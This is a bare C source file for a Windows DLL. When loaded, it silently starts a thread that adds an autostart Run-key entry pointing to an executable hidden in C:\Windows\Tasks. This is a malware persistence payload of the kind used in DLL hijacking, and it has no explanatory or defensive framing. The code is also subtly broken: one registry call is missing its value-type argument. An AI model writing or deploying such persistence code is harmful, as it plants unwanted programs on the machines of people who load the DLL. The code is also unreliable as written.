#include <windows.h>




DWORD WINAPI ex(LPVOID)
{
    HKEY key;
    const char *da = "C:\\Windows\\Tasks\\hsv.exe";
    RegCreateKeyA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&key);
    RegSetValueExA(key,"HSV",0,(const BYTE*)da,strlen(da)+1);
    RegCloseKey(key);
    return 0;
}



BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
{
    if(reason == DLL_PROCESS_ATTACH)
    {
        CreateThread(NULL,0,ex,NULL,0,NULL);
    }
    return TRUE;
}